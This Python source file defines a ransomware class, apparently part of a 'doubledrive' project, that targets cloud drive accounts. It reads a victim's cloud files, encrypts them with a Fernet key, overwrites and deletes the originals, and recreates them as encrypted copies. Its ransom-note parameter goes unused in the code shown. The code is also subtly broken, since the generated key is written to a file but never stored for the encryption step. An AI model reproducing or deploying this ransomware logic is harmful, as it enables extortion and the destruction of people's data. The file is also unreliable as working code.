import os
import uuid
from cryptography.fernet import Fernet

from doubledrive.cloud_drive.cloud_drive import *

class CloudDriveRansomware:

    def __init__(self, logged_in_cloud_drive: ICloudDriveSession, save_key_dir_path: str = "."):
        self._cloud_drive = logged_in_cloud_drive
        self.__save_key_dir_path = save_key_dir_path
        self.__key = None

    @abstractmethod
    def _first_stage_overwriting_finished_callback(self, paths_to_encrypted_contents):
        pass

    @abstractmethod
    def _second_stage_deletion_finished_callback(self, paths_to_encrypted_contents):
        pass

    @abstractmethod
    def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
        pass
        
    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], ransom_note: str, quick_delete: bool = False):
        self.__generate_key()
        self.__save_key()
        paths_to_encrypted_contents = self.__create_encrypted_contents_from_cloud_files(target_cloud_file_items)
        
        if not quick_delete:
            for cloud_file_path, file_encrypted_content in paths_to_encrypted_contents.items():
                cloud_drive_item = self._cloud_drive.get_item_by_path(cloud_file_path)
                self._cloud_drive.modify_file_content(cloud_drive_item, file_encrypted_content)
            self._first_stage_overwriting_finished_callback(paths_to_encrypted_contents)

        for cloud_file in target_cloud_file_items:
            self._cloud_drive.delete_item(cloud_file)
        self._second_stage_deletion_finished_callback(paths_to_encrypted_contents)

        for cloud_file_path, new_file_content in paths_to_encrypted_contents.items():
            self._cloud_drive.create_file(cloud_file_path, new_file_content)
        self._third_stage_recreation_finished_callback(paths_to_encrypted_contents)

    
    def __save_key(self):
        with open(os.path.join(self.__save_key_dir_path, str(uuid.uuid4())), "wb") as f:
            f.write(self.__key)

    def __generate_key(self) -> bytes:
        key = Fernet.generate_key()
        with open("key.key", "wb") as keyfile:
            keyfile.write(key)

    def __encrypt_file_content(self, file_content: bytes) -> bytes:
        return Fernet(self.__key).encrypt(file_content)

    def __create_encrypted_contents_from_cloud_files(self, target_cloud_file_items: list[CloudDriveFileItem]) -> dict[str, bytes]:
        paths_to_encrypted_contents = {}
        for cloud_file_item in target_cloud_file_items:
            print(f"Encrypting file: {cloud_file_item.full_path}")
            file_content = self._cloud_drive.read_file_content(cloud_file_item)
            file_new_content = self.__encrypt_file_content(file_content)
            paths_to_encrypted_contents[cloud_file_item.full_path] = file_new_content

        return paths_to_encrypted_contents